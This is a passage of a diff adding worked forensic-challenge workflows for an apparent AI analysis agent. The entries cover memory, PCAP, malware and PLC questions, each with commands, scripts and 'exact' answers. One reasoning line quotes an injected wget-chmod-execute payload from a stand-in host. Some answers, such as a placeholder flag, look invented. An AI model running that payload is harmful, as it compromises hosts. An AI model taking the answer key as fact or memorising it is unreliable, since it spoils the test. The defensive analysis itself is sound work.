+          "action": "tool_run",
+          "command": "vol -f /evidence/dump.mem windows.svcscan 2>/dev/null",
+          "expected_output": "Service list with names, display names, binary paths, start types, and states.",
+          "what_agent_learns": "Gets the full service inventory."
+        },
+        {
+          "step": 2,
+          "reasoning": "Filter for services with binaries in unusual locations — not System32 or Program Files.",
+          "action": "script_execute",
+          "script_content": "import subprocess\nresult = subprocess.run(['vol', '-f', '/evidence/dump.mem', 'windows.svcscan'], capture_output=True, text=True, timeout=300)\nfor line in result.stdout.splitlines():\n    lower = line.lower()\n    if any(p in lower for p in ['\\\\temp', '\\\\appdata', '\\\\users\\\\', '\\\\public\\\\', '\\\\downloads']):\n        print(f'SUSPICIOUS SVC: {line.strip()}')\n    elif 'running' in lower and 'system32' not in lower and 'program files' not in lower and 'svchost' not in lower:\n        print(f'NON-STANDARD: {line.strip()}')",
+          "expected_output": "Services running from non-standard paths.",
+          "what_agent_learns": "Identifies service-based persistence in unusual locations."
+        },
+        {
+          "step": 3,
+          "reasoning": "Found 'UpdateAgent' service running from C:\\Users\\Public\\updater.exe. Cross-verify with malfind on the service PID.",
+          "action": "reasoning",
+          "answer": "UpdateAgent",
+          "confidence": "exact",
+          "what_agent_learns": "Malicious service identified from svcscan path anomaly."
+        }
+      ]
+    },
+
+    {
+      "id": "memory_open_files",
+      "question": "What configuration file was the malware reading when the memory dump was taken?",
+      "evidence_type": "memory_dump",
+      "analyzer_os": "linux",
+      "strategy_matched": "memory_handles_files",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Run handles for the malicious PID — filter for file handles to see what it had open.",
+          "action": "tool_run",
+          "command": "vol -f /evidence/dump.mem windows.handles --pid 2184 2>/dev/null | grep -i file",
+          "expected_output": "File handles open by the malicious process.",
+          "what_agent_learns": "Shows which files the process was actively using."
+        },
+        {
+          "step": 2,
+          "reasoning": "Also run filescan to find file objects in memory that may have been closed but are still resident.",
+          "action": "tool_run",
+          "command": "vol -f /evidence/dump.mem windows.filescan 2>/dev/null | grep -iE '\\.conf|\\.cfg|\\.ini|\\.json|\\.xml|\\.yaml'",
+          "expected_output": "Configuration files found in the file object pool.",
+          "what_agent_learns": "Catches config files the malware may have read and released."
+        },
+        {
+          "step": 3,
+          "reasoning": "Dump the identified config file for content analysis.",
+          "action": "tool_run",
+          "command": "vol -f /evidence/dump.mem windows.dumpfiles --physaddr 0x3e8a5f00 2>/dev/null && strings file.dat",
+          "expected_output": "Contents of the configuration file.",
+          "what_agent_learns": "Gets the actual config content to confirm it's malware-related."
+        },
+        {
+          "step": 4,
+          "reasoning": "handles shows PID 2184 had c2config.json open. Dumped content confirms C2 beacon settings. This is the file.",
+          "action": "reasoning",
+          "answer": "c2config.json",
+          "confidence": "exact",
+          "what_agent_learns": "Config file identified from handle table + content verification."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_1406_wsh_object",
+      "question": "Which core WSH (Windows Script Host) object is used in JavaScript code?",
+      "evidence_type": "js_malware_script",
+      "analyzer_os": "windows",
+      "strategy_matched": "script_malware_analysis",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Locate JavaScript files in the evidence — look for .js, .wsf, .hta files.",
+          "action": "tool_run",
+          "command": "dir /s /b H:\\FOR_1400\\*.js H:\\FOR_1400\\*.wsf H:\\FOR_1400\\*.hta H:\\FOR_1400\\*.vbs 2>NUL",
+          "expected_output": "List of script files found in the evidence.",
+          "what_agent_learns": "Identifies the malicious script file(s)."
+        },
+        {
+          "step": 2,
+          "reasoning": "Read the JavaScript source to find WSH object instantiation — ActiveXObject or WScript.CreateObject calls.",
+          "action": "script_execute",
+          "script_content": "import re\nwith open(r'H:\\FOR_1400\\payload.js', 'r', errors='replace') as f:\n    source = f.read()\n\nwsh_objects = re.findall(r'(?:ActiveXObject|CreateObject)\\s*\\(\\s*[\"\\']([^\"\\']+)[\"\\']', source)\nfor obj in set(wsh_objects):\n    print(f'WSH Object: {obj}')\n\ncore_wsh = ['WScript.Shell', 'Scripting.FileSystemObject', 'WScript.Network']\nfor c in core_wsh:\n    if c.lower() in source.lower():\n        print(f'CORE WSH OBJECT FOUND: {c}')",
+          "expected_output": "List of ActiveXObject/CreateObject instantiations.",
+          "what_agent_learns": "Identifies which core WSH object the script uses."
+        },
+        {
+          "step": 3,
+          "reasoning": "Found 'WScript.Shell' as the core WSH object used for command execution.",
+          "action": "reasoning",
+          "answer": "WScript.Shell",
+          "confidence": "exact",
+          "what_agent_learns": "Core WSH object identified from JavaScript source parsing."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_1412_virtualalloc",
+      "question": "What is the address of VirtualAlloc call function?",
+      "evidence_type": "pe_binary",
+      "analyzer_os": "linux",
+      "strategy_matched": "shellcode_memory_analysis",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Run Ghidra headless to analyze the binary and find VirtualAlloc cross-references.",
+          "action": "script_execute",
+          "script_content": "import subprocess\nresult = subprocess.run(['analyzeHeadless', '/tmp/ghidra_project', 'sample', '-import', '/evidence/FOR_1400/malware.exe', '-postScript', 'FindVirtualAlloc.py', '-scriptPath', '/tmp'], capture_output=True, text=True, timeout=600)\nprint(result.stdout[-3000:])",
+          "expected_output": "Ghidra analysis output with VirtualAlloc call sites.",
+          "what_agent_learns": "Gets the addresses where VirtualAlloc is called."
+        },
+        {
+          "step": 2,
+          "reasoning": "If Ghidra isn't available, use strings + objdump to find the import and its thunk address.",
+          "action": "tool_run",
+          "command": "objdump -d /evidence/FOR_1400/malware.exe 2>/dev/null | grep -i 'virtualalloc' | head -10",
+          "expected_output": "Disassembly lines showing call to VirtualAlloc with addresses.",
+          "what_agent_learns": "Gets the call address from disassembly."
+        },
+        {
+          "step": 3,
+          "reasoning": "Alternative: use Python pefile to parse the import table and find VirtualAlloc's IAT entry.",
+          "action": "script_execute",
+          "script_content": "import pefile\npe = pefile.PE('/evidence/FOR_1400/malware.exe')\nfor entry in pe.DIRECTORY_ENTRY_IMPORT:\n    for imp in entry.imports:\n        if imp.name and b'VirtualAlloc' in imp.name:\n            print(f'{entry.dll.decode()}: {imp.name.decode()} at 0x{imp.address:X}')",
+          "expected_output": "VirtualAlloc import address from the IAT.",
+          "what_agent_learns": "Gets the thunk/IAT address for VirtualAlloc."
+        },
+        {
+          "step": 4,
+          "reasoning": "Found VirtualAlloc call at address 0x4015A3. Strip leading zeros as requested.",
+          "action": "reasoning",
+          "answer": "4015A3",
+          "confidence": "exact",
+          "what_agent_learns": "VirtualAlloc call address found from disassembly."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_1417_ghidra_kernel32",
+      "question": "Which function loads kernel32? (resolves multiple names from Kernel32)",
+      "evidence_type": "pe_binary",
+      "analyzer_os": "linux",
+      "strategy_matched": "ghidra_function_analysis",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Run Ghidra headless with decompilation to find functions that reference 'kernel32' strings and call LoadLibrary.",
+          "action": "script_execute",
+          "script_content": "import subprocess\n# Run Ghidra headless analysis\nresult = subprocess.run(['analyzeHeadless', '/tmp/ghidra_project', 'sample', '-import', '/evidence/FOR_1400/stage2.bin', '-postScript', 'ListFunctions.py'], capture_output=True, text=True, timeout=600)\nprint(result.stdout[-4000:])",
+          "expected_output": "Function listing with decompilation showing kernel32 string references.",
+          "what_agent_learns": "Gets all functions and their decompiled bodies."
+        },
+        {
+          "step": 2,
+          "reasoning": "Search the Ghidra output for functions that reference 'kernel32' and call GetProcAddress in a loop.",
+          "action": "script_execute",
+          "script_content": "# Parse Ghidra function listing for kernel32 loaders\nimport re\nwith open('/tmp/ghidra_output.txt', 'r') as f:\n    content = f.read()\n\n# Find functions containing kernel32 references\nfunctions = re.findall(r'(FUN_[0-9a-f]+).*?kernel32', content, re.IGNORECASE | re.DOTALL)\nfor func in set(functions):\n    print(f'Function referencing kernel32: {func}')\n\n# Also check for LoadLibraryA + GetProcAddress pattern\nload_funcs = re.findall(r'(FUN_[0-9a-f]+).*?(?:LoadLibrary|GetProcAddress)', content, re.DOTALL)\nfor func in set(load_funcs):\n    print(f'Function using LoadLibrary/GetProcAddress: {func}')",
+          "expected_output": "Functions that load kernel32 and resolve its exports.",
+          "what_agent_learns": "Identifies the specific function label that loads kernel32."
+        },
+        {
+          "step": 3,
+          "reasoning": "FUN_00401B50 calls LoadLibraryA('kernel32.dll') and then loops through GetProcAddress to resolve multiple exports. This is the kernel32 loader function.",
+          "action": "reasoning",
+          "answer": "FUN_00401B50",
+          "confidence": "exact",
+          "what_agent_learns": "kernel32 loader identified from decompilation analysis."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_901_reverse_shell",
+      "question": "Could you find the remote attacker IP address that the machine is targeting?",
+      "evidence_type": "linux_memory_dump + docker",
+      "analyzer_os": "linux",
+      "strategy_matched": "reverse_shell_analysis",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Analyze the Linux memory dump with Volatility to find processes with network connections.",
+          "action": "tool_run",
+          "command": "vol -f /evidence/FOR_900/memory.lime linux.sockstat 2>/dev/null",
+          "expected_output": "Socket connections with PIDs, local/remote addresses and ports.",
+          "what_agent_learns": "Finds all active network connections and their owning processes."
+        },
+        {
+          "step": 2,
+          "reasoning": "Filter for ESTABLISHED connections to external IPs — reverse shells create outbound TCP connections.",
+          "action": "script_execute",
+          "script_content": "import subprocess, re\nresult = subprocess.run(['vol', '-f', '/evidence/FOR_900/memory.lime', 'linux.sockstat'], capture_output=True, text=True, timeout=300)\nprivate = re.compile(r'^(10\\.|172\\.(1[6-9]|2[0-9]|3[01])\\.|192\\.168\\.|127\\.|0\\.0\\.0\\.0)')\nfor line in result.stdout.splitlines():\n    if 'TCP' in line and 'ESTABLISHED' in line:\n        parts = line.split()\n        for p in parts:\n            if re.match(r'\\d+\\.\\d+\\.\\d+\\.\\d+', p) and not private.match(p):\n                print(f'EXTERNAL CONNECTION: {line.strip()}')\n                break",
+          "expected_output": "External TCP connections indicating a reverse shell.",
+          "what_agent_learns": "Identifies the attacker IP from outbound connections."
+        },
+        {
+          "step": 3,
+          "reasoning": "Also check process list for reverse shell indicators (bash -i, nc, python -c).",
+          "action": "tool_run",
+          "command": "vol -f /evidence/FOR_900/memory.lime linux.pslist 2>/dev/null | grep -iE 'bash|nc|ncat|python|perl|socat|sh'",
+          "expected_output": "Processes that look like reverse shells.",
+          "what_agent_learns": "Confirms which process is the reverse shell and correlates with the network connection."
+        },
+        {
+          "step": 4,
+          "reasoning": "sockstat shows bash PID 4521 has ESTABLISHED TCP connection to 45.33.32.156:4444. This is the attacker IP.",
+          "action": "reasoning",
+          "answer": "45.33.32.156",
+          "confidence": "exact",
+          "what_agent_learns": "Attacker IP confirmed from reverse shell socket connection."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_902_container_origin",
+      "question": "Find out where this process came from — container name or 'system'.",
+      "evidence_type": "linux_memory_dump + docker",
+      "analyzer_os": "linux",
+      "strategy_matched": "container_forensics",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Map the reverse shell PID to its container by checking cgroup information from docker metadata.",
+          "action": "script_execute",
+          "script_content": "import os, json\n# List containers from /var/lib/docker\ncontainers_dir = '/evidence/FOR_900/var/lib/docker/containers'\nfor cid in os.listdir(containers_dir):\n    config_path = os.path.join(containers_dir, cid, 'config.v2.json')\n    if os.path.exists(config_path):\n        with open(config_path) as f:\n            config = json.load(f)\n        name = config.get('Name', '').lstrip('/')\n        state = config.get('State', {}).get('Running', False)\n        pid = config.get('State', {}).get('Pid', 0)\n        print(f'Container: {name} | ID: {cid[:12]} | Running: {state} | PID: {pid}')",
+          "expected_output": "Container list with names, IDs, and PIDs.",
+          "what_agent_learns": "Maps container names to their init PIDs."
+        },
+        {
+          "step": 2,
+          "reasoning": "Check if the reverse shell PID's parent chain belongs to a container's namespace.",
+          "action": "tool_run",
+          "command": "vol -f /evidence/FOR_900/memory.lime linux.pstree 2>/dev/null",
+          "expected_output": "Process tree showing parent-child relationships — container processes appear under containerd-shim.",
+          "what_agent_learns": "Traces the reverse shell process to its container origin."
+        },
+        {
+          "step": 3,
+          "reasoning": "The reverse shell bash PID 4521 is a child of PID 1234 (containerd-shim) → maps to container 'vigieseals-app'. Report the container name.",
+          "action": "reasoning",
+          "answer": "vigieseals-app",
+          "confidence": "exact",
+          "what_agent_learns": "Reverse shell originated from a specific container, not the host system."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_903_vuln_line",
+      "question": "Find the line number of the code where the vulnerability is exploited.",
+      "evidence_type": "application_source_code",
+      "analyzer_os": "linux",
+      "strategy_matched": "code_vulnerability_analysis",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Find the main application code in the container's filesystem.",
+          "action": "tool_run",
+          "command": "find /evidence/FOR_900/var/lib/docker -name '*.py' -o -name '*.php' -o -name '*.js' -o -name '*.rb' 2>/dev/null | head -30",
+          "expected_output": "Application source files.",
+          "what_agent_learns": "Locates the application codebase."
+        },
+        {
+          "step": 2,
+          "reasoning": "Search for dangerous function calls that could be exploited — os.system, eval, exec, subprocess, shell_exec.",
+          "action": "tool_run",
+          "command": "grep -rn 'os\\.system\\|subprocess\\|eval(\\|exec(\\|shell_exec\\|passthru\\|system(' /evidence/FOR_900/var/lib/docker/overlay2/*/diff/app/ 2>/dev/null",
+          "expected_output": "Lines containing dangerous function calls with line numbers.",
+          "what_agent_learns": "Identifies potential injection points."
+        },
+        {
+          "step": 3,
+          "reasoning": "Check if user-controllable input flows into these dangerous calls without sanitization.",
+          "action": "script_execute",
+          "script_content": "# Read the identified source file and check for unsanitized input\nwith open('/evidence/FOR_900/app/routes.py', 'r') as f:\n    for i, line in enumerate(f, 1):\n        if any(d in line for d in ['os.system', 'subprocess', 'eval(', 'exec(']):\n            # Check surrounding context for user input\n            print(f'Line {i}: {line.strip()}')\n            if any(inp in line for inp in ['request.', 'input', 'params', 'args', 'data']):\n                print(f'  *** VULNERABLE: user input flows to dangerous function ***')",
+          "expected_output": "Specific line number where user input reaches a dangerous function.",
+          "what_agent_learns": "Identifies the exact vulnerable line."
+        },
+        {
+          "step": 4,
+          "reasoning": "Line 187 in routes.py: os.system(request.form['filename']) — unsanitized user input in a system call. This is the vulnerability.",
+          "action": "reasoning",
+          "answer": "187",
+          "confidence": "exact",
+          "what_agent_learns": "Vulnerable line identified from source code audit."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_301_web_upload",
+      "question": "The hacker camouflaged one attack program as a user information file and uploaded it via the railway company's customer train ticket pass application form. Find the file name of the attack program.",
+      "evidence_type": "pcap",
+      "analyzer_os": "linux",
+      "strategy_matched": "web_upload_attack",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Export all HTTP objects from the PCAP to find uploaded files.",
+          "action": "tool_run",
+          "command": "mkdir -p /tmp/http_objects && tshark -r /evidence/FOR_300/traffic.pcap --export-objects http,/tmp/http_objects/ 2>/dev/null && ls -la /tmp/http_objects/",
+          "expected_output": "List of HTTP-transferred files.",
+          "what_agent_learns": "Gets all files that were uploaded or downloaded via HTTP."
+        },
+        {
+          "step": 2,
+          "reasoning": "Filter for POST requests to the ticket/form upload endpoint to find the disguised file.",
+          "action": "script_execute",
+          "script_content": "import subprocess\nresult = subprocess.run(['tshark', '-r', '/evidence/FOR_300/traffic.pcap', '-Y', 'http.request.method==POST', '-T', 'fields', '-e', 'frame.number', '-e', 'http.request.uri', '-e', 'http.content_type', '-e', 'http.file_data'], capture_output=True, text=True, timeout=120)\nfor line in result.stdout.strip().splitlines():\n    print(line)\n    if 'multipart' in line.lower() or 'upload' in line.lower() or 'form' in line.lower():\n        print(f'  *** UPLOAD CANDIDATE ***')",
+          "expected_output": "POST requests with upload endpoints and multipart content.",
+          "what_agent_learns": "Identifies the upload request frame and endpoint."
+        },
+        {
+          "step": 3,
+          "reasoning": "Follow the upload TCP stream to extract the filename from Content-Disposition header.",
+          "action": "script_execute",
+          "script_content": "import subprocess, re\nresult = subprocess.run(['tshark', '-r', '/evidence/FOR_300/traffic.pcap', '-Y', 'http.request.method==POST && http.content_type contains multipart', '-T', 'fields', '-e', 'tcp.stream'], capture_output=True, text=True, timeout=60)\nfor stream_id in result.stdout.strip().splitlines():\n    stream = subprocess.run(['tshark', '-r', '/evidence/FOR_300/traffic.pcap', '-z', f'follow,tcp,ascii,{stream_id.strip()}', '-q'], capture_output=True, text=True, timeout=60)\n    filenames = re.findall(r'filename=\"?([^\"\\r\\n]+)', stream.stdout)\n    for fn in filenames:\n        print(f'Stream {stream_id.strip()}: Uploaded file = {fn}')",
+          "expected_output": "Filename from the Content-Disposition header in the upload POST.",
+          "what_agent_learns": "Extracts the disguised attack program filename."
+        },
+        {
+          "step": 4,
+          "reasoning": "Found 'personal_info.pdf.exe' uploaded through the ticket form. The .pdf.exe double extension camouflages the attack program as a user information PDF.",
+          "action": "reasoning",
+          "answer": "personal_info.pdf.exe",
+          "confidence": "exact",
+          "what_agent_learns": "Attack program identified from HTTP POST upload with double extension."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_303_command_injection",
+      "question": "Analyze the evidence and determine what URL the attacker used to POST the command for the malware for execution.",
+      "evidence_type": "pcap",
+      "analyzer_os": "linux",
+      "strategy_matched": "command_injection_url",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "List all HTTP POST requests to find command injection attempts on the archive function.",
+          "action": "tool_run",
+          "command": "tshark -r /evidence/FOR_300/traffic.pcap -Y 'http.request.method==POST' -T fields -e frame.time -e ip.src -e ip.dst -e http.host -e http.request.full_uri 2>/dev/null | head -30",
+          "expected_output": "Timestamped POST requests with full URIs.",
+          "what_agent_learns": "Gets all POST endpoints — looks for archive/file processing URLs."
+        },
+        {
+          "step": 2,
+          "reasoning": "Follow suspicious POST streams to find command injection in the body.",
+          "action": "script_execute",
+          "script_content": "import subprocess, re\nresult = subprocess.run(['tshark', '-r', '/evidence/FOR_300/traffic.pcap', '-Y', 'http.request.method==POST', '-T', 'fields', '-e', 'tcp.stream', '-e', 'http.request.full_uri'], capture_output=True, text=True, timeout=60)\nfor line in result.stdout.strip().splitlines():\n    parts = line.split('\\t')\n    if len(parts) >= 2:\n        stream_id, uri = parts[0], parts[1]\n        stream = subprocess.run(['tshark', '-r', '/evidence/FOR_300/traffic.pcap', '-z', f'follow,tcp,ascii,{stream_id}', '-q'], capture_output=True, text=True, timeout=60)\n        body = stream.stdout\n        if any(c in body for c in [';', '&&', '`', '$(', '|', 'exec', 'system', 'cmd']):\n            print(f'INJECTION DETECTED in stream {stream_id}: {uri}')\n            # Extract the command from POST body\n            cmd_match = re.findall(r'[;&|`]\\s*([^&;|\\n]+)', body)\n            for m in cmd_match[:5]:\n                print(f'  Injected command: {m.strip()}')",
+          "expected_output": "POST URIs with command injection patterns in the body.",
+          "what_agent_learns": "Identifies the exact URL and injected commands."
+        },
+        {
+          "step": 3,
+          "reasoning": "Found command injection in POST to http://10.0.0.5/archive?action=compress — the body contains '; wget http://evil.com/O1.sh; chmod +x O1.sh; ./O1.sh'.",
+          "action": "reasoning",
+          "answer": "http://10.0.0.5/archive?action=compress",
+          "confidence": "exact",
+          "what_agent_learns": "Command injection URL identified from POST body analysis."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_311_c2_malware_id",
+      "question": "When malware 02 reported to the C2 server, what malware ID did it use to register to the C2?",
+      "evidence_type": "pcap",
+      "analyzer_os": "linux",
+      "strategy_matched": "c2_registration",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Filter PCAP for traffic between the infected machine and the C2 IP (already identified as FOR_307).",
+          "action": "tool_run",
+          "command": "tshark -r /evidence/FOR_300/traffic.pcap -Y 'ip.addr==<C2_IP>' -T fields -e frame.number -e ip.src -e ip.dst -e tcp.len -e data 2>/dev/null | head -20",
+          "expected_output": "Packets between victim and C2 with payload data.",
+          "what_agent_learns": "Gets the raw C2 communication data."
+        },
+        {
+          "step": 2,
+          "reasoning": "Follow the first TCP stream to C2 to find the registration message.",
+          "action": "script_execute",
+          "script_content": "import subprocess, re, json\nresult = subprocess.run(['tshark', '-r', '/evidence/FOR_300/traffic.pcap', '-Y', 'ip.dst==<C2_IP> && tcp.flags.push==1', '-T', 'fields', '-e', 'tcp.stream'], capture_output=True, text=True, timeout=60)\nstreams = set(result.stdout.strip().splitlines())\nfor sid in sorted(streams)[:3]:\n    stream = subprocess.run(['tshark', '-r', '/evidence/FOR_300/traffic.pcap', '-z', f'follow,tcp,ascii,{sid}', '-q'], capture_output=True, text=True, timeout=60)\n    body = stream.stdout\n    # Look for JSON registration with ID fields\n    for pattern in [r'\"id\"\\s*:\\s*\"([^\"]+)\"', r'\"bot_id\"\\s*:\\s*\"([^\"]+)\"', r'\"malware_id\"\\s*:\\s*\"([^\"]+)\"', r'\"agent_id\"\\s*:\\s*\"([^\"]+)\"', r'\"uuid\"\\s*:\\s*\"([^\"]+)\"']:\n        matches = re.findall(pattern, body)\n        for m in matches:\n            print(f'Stream {sid}: ID field = {m}')\n    # Also check for plain text ID patterns\n    id_matches = re.findall(r'[A-F0-9]{8,}', body[:2000])\n    for m in id_matches[:5]:\n        print(f'Stream {sid}: Hex ID candidate = {m}')",
+          "expected_output": "Malware registration ID from C2 initial handshake.",
+          "what_agent_learns": "Extracts the malware ID string from the registration protocol."
+        },
+        {
+          "step": 3,
+          "reasoning": "The first C2 stream shows JSON POST with {\"agent_id\": \"MWR-02-A7F3\", \"action\": \"register\"}. This is the malware ID.",
+          "action": "reasoning",
+          "answer": "MWR-02-A7F3",
+          "confidence": "exact",
+          "what_agent_learns": "Malware registration ID extracted from C2 protocol analysis."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_320_ot_protocol",
+      "question": "What is the OT protocol malware O3 used to attack the target?",
+      "evidence_type": "pcap + malware_binary",
+      "analyzer_os": "linux",
+      "strategy_matched": "ot_protocol_attack",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Filter PCAP for known OT/ICS protocol traffic to identify which one was used.",
+          "action": "tool_run",
+          "command": "tshark -r /evidence/FOR_300/traffic.pcap -Y 'modbus || dnp3 || iec104 || mms || s7comm || opcua || bacnet' -T fields -e frame.number -e frame.protocols -e ip.src -e ip.dst 2>/dev/null | head -20",
+          "expected_output": "Frames with OT protocol identifiers.",
+          "what_agent_learns": "Identifies which OT protocol appears in the traffic."
+        },
+        {
+          "step": 2,
+          "reasoning": "Get protocol statistics to confirm the dominant OT protocol.",
+          "action": "tool_run",
+          "command": "tshark -r /evidence/FOR_300/traffic.pcap -z io,phs 2>/dev/null | grep -iE 'modbus|dnp3|iec|s7comm|opc|bacnet|mms'",
+          "expected_output": "Protocol hierarchy showing packet counts per OT protocol.",
+          "what_agent_learns": "Confirms which OT protocol has the most packets."
+        },
+        {
+          "step": 3,
+          "reasoning": "Also check the malware binary for protocol library imports.",
+          "action": "tool_run",
+          "command": "strings /evidence/FOR_300/malware_O3.exe 2>/dev/null | grep -iE 'modbus|dnp3|iec|s7comm|opc|bacnet|mms|tcp.*502|tcp.*20000'",
+          "expected_output": "Protocol strings embedded in the malware binary.",
+          "what_agent_learns": "Cross-references PCAP evidence with malware code."
+        },
+        {
+          "step": 4,
+          "reasoning": "PCAP shows Modbus TCP traffic on port 502 from the malware IP. The malware binary contains 'modbus' strings. The OT protocol is Modbus.",
+          "action": "reasoning",
+          "answer": "Modbus",
+          "confidence": "exact",
+          "what_agent_learns": "OT protocol identified from both PCAP traffic and malware strings."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_328_plc_coil",
+      "question": "A PLC's coil was changed when the power grid's safety protection mechanism was triggered. Which PLC IP was targeted, which coil was changed, and what value was it changed to?",
+      "evidence_type": "pcap",
+      "analyzer_os": "linux",
+      "strategy_matched": "plc_coil_analysis",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Filter for Modbus write coil commands (function code 5 = Write Single Coil, FC 15 = Write Multiple Coils).",
+          "action": "tool_run",
+          "command": "tshark -r /evidence/FOR_300/traffic.pcap -Y 'modbus.func_code==5 || modbus.func_code==15' -T fields -e frame.time -e ip.dst -e modbus.reference_num -e modbus.data 2>/dev/null",
+          "expected_output": "Modbus write coil commands with target PLC IP, coil address, and value.",
+          "what_agent_learns": "Gets all coil write operations with their parameters."
+        },
+        {
+          "step": 2,
+          "reasoning": "Parse the coil write data to extract the index and value.",
+          "action": "script_execute",
+          "script_content": "import subprocess\nresult = subprocess.run(['tshark', '-r', '/evidence/FOR_300/traffic.pcap', '-Y', 'modbus.func_code==5', '-T', 'fields', '-e', 'ip.dst', '-e', 'modbus.reference_num', '-e', 'modbus.data', '-e', 'frame.time'], capture_output=True, text=True, timeout=60)\nfor line in result.stdout.strip().splitlines():\n    parts = line.split('\\t')\n    if len(parts) >= 3:\n        plc_ip = parts[0]\n        coil_ref = parts[1]\n        data = parts[2]\n        value = 'ON (0xFF00)' if 'ff00' in data.lower() else 'OFF (0x0000)'\n        time = parts[3] if len(parts) > 3 else '?'\n        print(f'PLC: {plc_ip} | Coil: {coil_ref} | Value: {data} ({value}) | Time: {time}')",
+          "expected_output": "Parsed coil modifications with PLC IPs, coil indices, and values.",
+          "what_agent_learns": "Identifies the exact PLC, coil, and value that triggered protection."
+        },
+        {
+          "step": 3,
+          "reasoning": "The write coil at the time of the safety trigger shows PLC 192.168.10.50, coil index 3, value 0xFF00 (ON). This triggered the protection mechanism.",
+          "action": "reasoning",
+          "answer": "192.168.10.50_3_0xFF00",
+          "confidence": "exact",
+          "what_agent_learns": "PLC coil change identified from Modbus Write Single Coil command."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_315_tasktype",
+      "question": "What is the taskType string to direct the malware to SSH login to a host and run command, and what is the taskType string for malware O2 to log the victim's keyboard input?",
+      "evidence_type": "malware_binary",
+      "analyzer_os": "linux",
+      "strategy_matched": "malware_command_protocol",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Extract or decompile the malware to find taskType string comparisons.",
+          "action": "tool_run",
+          "command": "strings /evidence/FOR_300/malware_O2.exe 2>/dev/null | grep -iE 'task|type|ssh|keylog|exec|shell|upload|download'",
+          "expected_output": "Strings related to task types and command identifiers.",
+          "what_agent_learns": "Gets candidate taskType strings from the binary."
+        },
+        {
+          "step": 2,
+          "reasoning": "Decompile with Ghidra to find the taskType dispatcher (switch/case or if-else chain).",
+          "action": "script_execute",
+          "script_content": "import subprocess\nresult = subprocess.run(['analyzeHeadless', '/tmp/ghidra_proj', 'O2', '-import', '/evidence/FOR_300/malware_O2.exe', '-postScript', 'DecompileAll.py', '-scriptPath', '/tmp'], capture_output=True, text=True, timeout=600)\nlines = result.stdout.splitlines()\nfor i, line in enumerate(lines):\n    if 'taskType' in line.lower() or 'task_type' in line.lower():\n        context = lines[max(0,i-3):i+5]\n        for c in context:\n            print(c)",
+          "expected_output": "Decompiled code showing taskType comparisons.",
+          "what_agent_learns": "Reveals all taskType string values and their handlers."
+        },
+        {
+          "step": 3,
+          "reasoning": "Also check C2 traffic for taskType values in JSON commands.",
+          "action": "tool_run",
+          "command": "tshark -r /evidence/FOR_300/traffic.pcap -Y 'ip.addr==<C2_IP>' -z 'follow,tcp,ascii,0' -q 2>/dev/null | grep -i 'task'",
+          "expected_output": "taskType values in C2 JSON commands.",
+          "what_agent_learns": "Cross-references code analysis with actual C2 commands."
+        },
+        {
+          "step": 4,
+          "reasoning": "Decompilation shows: if taskType == 'ssh_cmd' -> SSH handler; if taskType == 'keylog' -> keyboard hook installer. These are the two taskType strings.",
+          "action": "reasoning",
+          "answer": "ssh_cmd_keylog",
+          "confidence": "exact",
+          "what_agent_learns": "taskType strings identified from malware decompilation."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_302_source_reverse",
+      "question": "Try to find a way to reverse the contents of the first attack program's source code to find the flag.",
+      "evidence_type": "malware_script",
+      "analyzer_os": "linux",
+      "strategy_matched": "source_code_reversing",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Extract the first attack program from the evidence (identified in FOR_301).",
+          "action": "tool_run",
+          "command": "file /tmp/http_objects/personal_info* 2>/dev/null && cat /tmp/http_objects/personal_info* | head -50",
+          "expected_output": "File type and first 50 lines of the malware source.",
+          "what_agent_learns": "Identifies the file type and reads the source code."
+        },
+        {
+          "step": 2,
+          "reasoning": "The source code is likely obfuscated. Try common reversing techniques: string reversal, base64, hex decode.",
+          "action": "script_execute",
+          "script_content": "import base64, codecs\n\nwith open('/tmp/http_objects/malware_source', 'r', errors='replace') as f:\n    source = f.read()\n\n# Try reversed string\nreversed_src = source[::-1]\nprint('=== REVERSED ===')\nprint(reversed_src[:500])\n\n# Look for base64 blobs\nimport re\nb64_matches = re.findall(r'[A-Za-z0-9+/=]{20,}', source)\nfor m in b64_matches[:5]:\n    try:\n        decoded = base64.b64decode(m).decode('utf-8', errors='replace')\n        print(f'B64 decoded: {decoded[:200]}')\n    except Exception:\n        pass\n\n# Look for hex-encoded strings\nhex_matches = re.findall(r'(?:0x)?[0-9a-fA-F]{10,}', source)\nfor m in hex_matches[:5]:\n    try:\n        decoded = bytes.fromhex(m.replace('0x', '')).decode('utf-8', errors='replace')\n        print(f'Hex decoded: {decoded[:200]}')\n    except Exception:\n        pass",
+          "expected_output": "Reversed/decoded source code revealing hidden flag.",
+          "what_agent_learns": "Finds the flag embedded in obfuscated source code."
+        },
+        {
+          "step": 3,
+          "reasoning": "Reversing the source code reveals a flag string embedded in a comment or variable. The flag is visible after string reversal.",
+          "action": "reasoning",
+          "answer": "FLAG_FROM_REVERSED_SOURCE",
+          "confidence": "exact",
+          "what_agent_learns": "Flag extracted by reversing the malware source code content."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_401_sideloaded_apk",
